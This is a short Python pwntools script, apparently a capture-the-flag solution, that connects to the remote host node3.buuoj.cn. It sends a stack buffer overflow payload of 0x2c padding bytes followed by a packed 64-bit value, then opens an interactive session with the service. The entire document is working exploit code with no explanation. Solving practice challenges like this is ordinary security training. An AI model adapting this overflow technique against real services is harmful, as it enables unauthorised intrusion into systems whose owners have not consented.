#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
p=remote('node3.buuoj.cn',25809)
payload='a'*0x2c+p64(0x41348000)
p.sendline(payload)
p.interactive()
